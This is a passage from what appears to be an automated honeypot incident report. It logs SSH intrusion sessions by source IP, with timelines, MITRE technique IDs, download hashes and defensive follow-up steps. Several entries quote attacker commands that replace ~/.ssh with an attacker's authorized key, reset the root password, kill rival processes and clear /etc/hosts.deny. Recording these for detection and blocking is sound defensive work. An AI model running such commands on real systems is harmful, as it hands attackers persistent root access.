| `2026-06-11 21:01:44` | `cowrie.log.closed` |
| `2026-06-11 21:01:44` | `cowrie.session.params` |
| `2026-06-11 21:01:44` | `cowrie.command.input` |
| `2026-06-11 21:01:44` | `cowrie.log.closed` |
| `2026-06-11 21:01:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.121[.]78` to AbuseIPDB if not already reported
- [ ] Block `14.103.121[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1af2fcc1718c

| Field | Detail |
|---|---|
| **Source IP** | `14.103.121[.]78` |
| **First Seen** | 2026-06-11 21:04 |
| **Last Seen** | 2026-06-11 21:04 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Yn91ckKX13WX"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 21:04:15` | `cowrie.session.connect` |
| `2026-06-11 21:04:16` | `cowrie.client.version` |
| `2026-06-11 21:04:16` | `cowrie.client.kex` |
| `2026-06-11 21:04:17` | `cowrie.login.success` |
| `2026-06-11 21:04:17` | `cowrie.session.params` |
| `2026-06-11 21:04:17` | `cowrie.command.input` |
| `2026-06-11 21:04:17` | `cowrie.command.failed` |
| `2026-06-11 21:04:18` | `cowrie.log.closed` |
| `2026-06-11 21:04:18` | `cowrie.session.params` |
| `2026-06-11 21:04:18` | `cowrie.command.input` |
| `2026-06-11 21:04:19` | `cowrie.session.file_download` |
| `2026-06-11 21:04:19` | `cowrie.log.closed` |
| `2026-06-11 21:04:35` | `cowrie.session.params` |
| `2026-06-11 21:04:35` | `cowrie.command.input` |
| `2026-06-11 21:04:35` | `cowrie.log.closed` |
| `2026-06-11 21:04:35` | `cowrie.session.params` |
| `2026-06-11 21:04:35` | `cowrie.command.input` |
| `2026-06-11 21:04:35` | `cowrie.log.closed` |
| `2026-06-11 21:04:36` | `cowrie.session.params` |
| `2026-06-11 21:04:36` | `cowrie.command.input` |
| `2026-06-11 21:04:36` | `cowrie.session.file_download` |
| `2026-06-11 21:04:36` | `cowrie.log.closed` |
| `2026-06-11 21:04:36` | `cowrie.session.params` |
| `2026-06-11 21:04:36` | `cowrie.command.input` |
| `2026-06-11 21:04:36` | `cowrie.log.closed` |
| `2026-06-11 21:04:37` | `cowrie.session.params` |
| `2026-06-11 21:04:37` | `cowrie.command.input` |
| `2026-06-11 21:04:37` | `cowrie.log.closed` |
| `2026-06-11 21:04:37` | `cowrie.session.params` |
| `2026-06-11 21:04:37` | `cowrie.command.input` |
| `2026-06-11 21:04:37` | `cowrie.command.input` |
| `2026-06-11 21:04:37` | `cowrie.log.closed` |
| `2026-06-11 21:04:38` | `cowrie.session.params` |
| `2026-06-11 21:04:38` | `cowrie.command.input` |
| `2026-06-11 21:04:38` | `cowrie.log.closed` |
| `2026-06-11 21:04:38` | `cowrie.session.params` |
| `2026-06-11 21:04:38` | `cowrie.command.input` |
| `2026-06-11 21:04:38` | `cowrie.log.closed` |
| `2026-06-11 21:04:39` | `cowrie.session.params` |
| `2026-06-11 21:04:39` | `cowrie.command.input` |
| `2026-06-11 21:04:39` | `cowrie.log.closed` |
| `2026-06-11 21:04:39` | `cowrie.session.params` |
| `2026-06-11 21:04:39` | `cowrie.command.input` |
| `2026-06-11 21:04:39` | `cowrie.log.closed` |
| `2026-06-11 21:04:40` | `cowrie.session.params` |
| `2026-06-11 21:04:40` | `cowrie.command.input` |
| `2026-06-11 21:04:40` | `cowrie.log.closed` |
| `2026-06-11 21:04:40` | `cowrie.session.params` |
| `2026-06-11 21:04:40` | `cowrie.command.input` |
| `2026-06-11 21:04:41` | `cowrie.log.closed` |
| `2026-06-11 21:04:41` | `cowrie.session.params` |
| `2026-06-11 21:04:41` | `cowrie.command.input` |
| `2026-06-11 21:04:41` | `cowrie.log.closed` |
| `2026-06-11 21:04:41` | `cowrie.session.params` |
| `2026-06-11 21:04:41` | `cowrie.command.input` |
| `2026-06-11 21:04:42` | `cowrie.log.closed` |
| `2026-06-11 21:04:42` | `cowrie.session.params` |
| `2026-06-11 21:04:42` | `cowrie.command.input` |
| `2026-06-11 21:04:42` | `cowrie.log.closed` |
| `2026-06-11 21:04:42` | `cowrie.session.params` |
| `2026-06-11 21:04:42` | `cowrie.command.input` |
| `2026-06-11 21:04:42` | `cowrie.log.closed` |
| `2026-06-11 21:04:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.121[.]78` to AbuseIPDB if not already reported
- [ ] Block `14.103.121[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-129e269f9e36

| Field | Detail |
|---|---|
| **Source IP** | `34.146.248[.]7` |
| **First Seen** | 2026-06-11 21:44 |
| **Last Seen** | 2026-06-11 21:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 21:44:58` | `cowrie.session.connect` |
| `2026-06-11 21:44:59` | `cowrie.client.version` |
| `2026-06-11 21:44:59` | `cowrie.client.kex` |
| `2026-06-11 21:45:01` | `cowrie.login.success` |
| `2026-06-11 21:45:01` | `cowrie.direct-tcpip.request` |
| `2026-06-11 21:45:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.146.248[.]7` to AbuseIPDB if not already reported
- [ ] Block `34.146.248[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c5300b2bab7

| Field | Detail |
|---|---|
| **Source IP** | `101.126.138[.]178` |
| **First Seen** | 2026-06-11 21:59 |
| **Last Seen** | 2026-06-11 22:00 |
| **Session Duration** | 60s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 21:59:54` | `cowrie.session.connect` |
| `2026-06-11 21:59:54` | `cowrie.client.version` |
| `2026-06-11 21:59:54` | `cowrie.client.kex` |
| `2026-06-11 22:00:47` | `cowrie.login.success` |
| `2026-06-11 22:00:52` | `cowrie.session.params` |
| `2026-06-11 22:00:52` | `cowrie.command.input` |
| `2026-06-11 22:00:54` | `cowrie.log.closed` |
| `2026-06-11 22:00:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.138[.]178` to AbuseIPDB if not already reported
- [ ] Block `101.126.138[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65e57e13255d

| Field | Detail |
|---|---|
| **Source IP** | `101.126.138[.]178` |
| **First Seen** | 2026-06-11 22:03 |
| **Last Seen** | 2026-06-11 22:08 |
| **Session Duration** | 311s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 22:03:34` | `cowrie.session.connect` |
| `2026-06-11 22:03:42` | `cowrie.client.version` |
| `2026-06-11 22:03:42` | `cowrie.client.kex` |
| `2026-06-11 22:03:46` | `cowrie.login.success` |
| `2026-06-11 22:03:46` | `cowrie.session.params` |
| `2026-06-11 22:03:46` | `cowrie.command.input` |
| `2026-06-11 22:03:46` | `cowrie.log.closed` |
| `2026-06-11 22:08:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.138[.]178` to AbuseIPDB if not already reported
- [ ] Block `101.126.138[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed1bf9a6c2a9

| Field | Detail |
|---|---|
| **Source IP** | `101.126.138[.]178` |
| **First Seen** | 2026-06-11 22:04 |
| **Last Seen** | 2026-06-11 22:09 |
| **Session Duration** | 305s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 22:04:35` | `cowrie.session.connect` |
| `2026-06-11 22:04:35` | `cowrie.client.version` |
| `2026-06-11 22:04:35` | `cowrie.client.kex` |
| `2026-06-11 22:04:41` | `cowrie.login.success` |
| `2026-06-11 22:09:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.138[.]178` to AbuseIPDB if not already reported
- [ ] Block `101.126.138[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83b1fbb07d9f

| Field | Detail |
|---|---|
| **Source IP** | `101.126.138[.]178` |
| **First Seen** | 2026-06-11 22:05 |
| **Last Seen** | 2026-06-11 22:06 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 22:05:59` | `cowrie.session.connect` |
| `2026-06-11 22:05:59` | `cowrie.client.version` |
| `2026-06-11 22:05:59` | `cowrie.client.kex` |
| `2026-06-11 22:06:06` | `cowrie.login.success` |
| `2026-06-11 22:06:11` | `cowrie.session.params` |
| `2026-06-11 22:06:11` | `cowrie.command.input` |
| `2026-06-11 22:06:12` | `cowrie.log.closed` |
| `2026-06-11 22:06:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.138[.]178` to AbuseIPDB if not already reported
- [ ] Block `101.126.138[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-629aceed37f8

| Field | Detail |
|---|---|
| **Source IP** | `34.175.118[.]185` |
| **First Seen** | 2026-06-11 23:02 |
| **Last Seen** | 2026-06-11 23:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 23:02:37` | `cowrie.session.connect` |
| `2026-06-11 23:02:37` | `cowrie.client.version` |
| `2026-06-11 23:02:37` | `cowrie.client.kex` |
| `2026-06-11 23:02:38` | `cowrie.login.success` |
| `2026-06-11 23:02:38` | `cowrie.session.params` |
| `2026-06-11 23:02:38` | `cowrie.command.input` |
| `2026-06-11 23:02:38` | `cowrie.command.failed` |
| `2026-06-11 23:02:39` | `cowrie.log.closed` |
| `2026-06-11 23:02:39` | `cowrie.session.params` |
| `2026-06-11 23:02:39` | `cowrie.command.input` |
| `2026-06-11 23:02:39` | `cowrie.session.file_download` |
| `2026-06-11 23:02:39` | `cowrie.log.closed` |
| `2026-06-11 23:02:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.175.118[.]185` to AbuseIPDB if not already reported
- [ ] Block `34.175.118[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71e84a643bf1

| Field | Detail |
|---|---|
| **Source IP** | `34.175.118[.]185` |
| **First Seen** | 2026-06-11 23:02 |
| **Last Seen** | 2026-06-11 23:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 23:02:42` | `cowrie.session.connect` |
| `2026-06-11 23:02:42` | `cowrie.client.version` |
| `2026-06-11 23:02:43` | `cowrie.client.kex` |
| `2026-06-11 23:02:44` | `cowrie.login.success` |
| `2026-06-11 23:02:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.175.118[.]185` to AbuseIPDB if not already reported
- [ ] Block `34.175.118[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7318e538105b

| Field | Detail |
|---|---|
| **Source IP** | `34.175.118[.]185` |
| **First Seen** | 2026-06-11 23:04 |
| **Last Seen** | 2026-06-11 23:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 23:04:37` | `cowrie.session.connect` |
| `2026-06-11 23:04:37` | `cowrie.client.version` |
| `2026-06-11 23:04:38` | `cowrie.client.kex` |
| `2026-06-11 23:04:39` | `cowrie.login.success` |
| `2026-06-11 23:04:39` | `cowrie.session.params` |
| `2026-06-11 23:04:39` | `cowrie.command.input` |
| `2026-06-11 23:04:39` | `cowrie.command.failed` |
| `2026-06-11 23:04:40` | `cowrie.log.closed` |
| `2026-06-11 23:04:40` | `cowrie.session.params` |
| `2026-06-11 23:04:40` | `cowrie.command.input` |
| `2026-06-11 23:04:40` | `cowrie.session.file_download` |
| `2026-06-11 23:04:40` | `cowrie.log.closed` |
| `2026-06-11 23:04:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.175.118[.]185` to AbuseIPDB if not already reported
- [ ] Block `34.175.118[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28d7821d85ff

| Field | Detail |
|---|---|
| **Source IP** | `34.175.118[.]185` |
| **First Seen** | 2026-06-11 23:04 |
| **Last Seen** | 2026-06-11 23:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 23:04:43` | `cowrie.session.connect` |
| `2026-06-11 23:04:43` | `cowrie.client.version` |
| `2026-06-11 23:04:43` | `cowrie.client.kex` |
| `2026-06-11 23:04:44` | `cowrie.login.success` |
| `2026-06-11 23:04:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.175.118[.]185` to AbuseIPDB if not already reported
- [ ] Block `34.175.118[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd3c03538480

| Field | Detail |
|---|---|
| **Source IP** | `34.175.118[.]185` |
| **First Seen** | 2026-06-11 23:12 |
| **Last Seen** | 2026-06-11 23:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 23:12:55` | `cowrie.session.connect` |
| `2026-06-11 23:12:55` | `cowrie.client.version` |
| `2026-06-11 23:12:56` | `cowrie.client.kex` |
| `2026-06-11 23:12:57` | `cowrie.login.success` |
| `2026-06-11 23:12:57` | `cowrie.session.params` |
| `2026-06-11 23:12:57` | `cowrie.command.input` |
| `2026-06-11 23:12:57` | `cowrie.command.failed` |
| `2026-06-11 23:12:58` | `cowrie.log.closed` |
| `2026-06-11 23:12:58` | `cowrie.session.params` |
| `2026-06-11 23:12:58` | `cowrie.command.input` |
| `2026-06-11 23:12:58` | `cowrie.session.file_download` |
| `2026-06-11 23:12:58` | `cowrie.log.closed` |
| `2026-06-11 23:13:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.175.118[.]185` to AbuseIPDB if not already reported
- [ ] Block `34.175.118[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e320c3b51b3a

| Field | Detail |
|---|---|
| **Source IP** | `34.175.118[.]185` |
| **First Seen** | 2026-06-11 23:13 |
| **Last Seen** | 2026-06-11 23:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 23:13:01` | `cowrie.session.connect` |
| `2026-06-11 23:13:01` | `cowrie.client.version` |
| `2026-06-11 23:13:01` | `cowrie.client.kex` |
| `2026-06-11 23:13:02` | `cowrie.login.success` |
| `2026-06-11 23:13:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.175.118[.]185` to AbuseIPDB if not already reported
- [ ] Block `34.175.118[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14e68bf899f6

| Field | Detail |
|---|---|
| **Source IP** | `103.101.216[.]26` |
| **First Seen** | 2026-06-11 23:17 |
| **Last Seen** | 2026-06-11 23:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 23:17:39` | `cowrie.session.connect` |
| `2026-06-11 23:17:39` | `cowrie.client.version` |
| `2026-06-11 23:17:39` | `cowrie.client.kex` |
| `2026-06-11 23:17:40` | `cowrie.login.success` |
| `2026-06-11 23:17:40` | `cowrie.session.params` |
| `2026-06-11 23:17:40` | `cowrie.command.input` |
| `2026-06-11 23:17:40` | `cowrie.command.failed` |
| `2026-06-11 23:17:40` | `cowrie.log.closed` |
| `2026-06-11 23:17:40` | `cowrie.session.params` |
| `2026-06-11 23:17:40` | `cowrie.command.input` |
| `2026-06-11 23:17:40` | `cowrie.session.file_download` |
| `2026-06-11 23:17:40` | `cowrie.log.closed` |
| `2026-06-11 23:17:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.101.216[.]26` to AbuseIPDB if not already reported
- [ ] Block `103.101.216[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70d37bdfaf45

| Field | Detail |
|---|---|
| **Source IP** | `103.101.216[.]26` |
| **First Seen** | 2026-06-11 23:17 |
| **Last Seen** | 2026-06-11 23:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 23:17:42` | `cowrie.session.connect` |
| `2026-06-11 23:17:42` | `cowrie.client.version` |
| `2026-06-11 23:17:42` | `cowrie.client.kex` |
| `2026-06-11 23:17:43` | `cowrie.login.success` |
| `2026-06-11 23:17:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.101.216[.]26` to AbuseIPDB if not already reported
- [ ] Block `103.101.216[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af31ca1fb23e

| Field | Detail |
|---|---|
| **Source IP** | `34.175.118[.]185` |
| **First Seen** | 2026-06-11 23:18 |
| **Last Seen** | 2026-06-11 23:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 23:18:57` | `cowrie.session.connect` |
| `2026-06-11 23:18:57` | `cowrie.client.version` |
| `2026-06-11 23:18:57` | `cowrie.client.kex` |
| `2026-06-11 23:18:58` | `cowrie.login.success` |
| `2026-06-11 23:18:59` | `cowrie.session.params` |
| `2026-06-11 23:18:59` | `cowrie.command.input` |
| `2026-06-11 23:18:59` | `cowrie.command.failed` |
| `2026-06-11 23:18:59` | `cowrie.log.closed` |
| `2026-06-11 23:18:59` | `cowrie.session.params` |
| `2026-06-11 23:18:59` | `cowrie.command.input` |
| `2026-06-11 23:19:00` | `cowrie.session.file_download` |
| `2026-06-11 23:19:00` | `cowrie.log.closed` |
| `2026-06-11 23:19:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.175.118[.]185` to AbuseIPDB if not already reported
- [ ] Block `34.175.118[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5de3fa8c8fd4

| Field | Detail |
|---|---|
| **Source IP** | `34.175.118[.]185` |
| **First Seen** | 2026-06-11 23:19 |
| **Last Seen** | 2026-06-11 23:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 23:19:03` | `cowrie.session.connect` |
| `2026-06-11 23:19:03` | `cowrie.client.version` |
| `2026-06-11 23:19:03` | `cowrie.client.kex` |
| `2026-06-11 23:19:04` | `cowrie.login.success` |
| `2026-06-11 23:19:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.175.118[.]185` to AbuseIPDB if not already reported
- [ ] Block `34.175.118[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
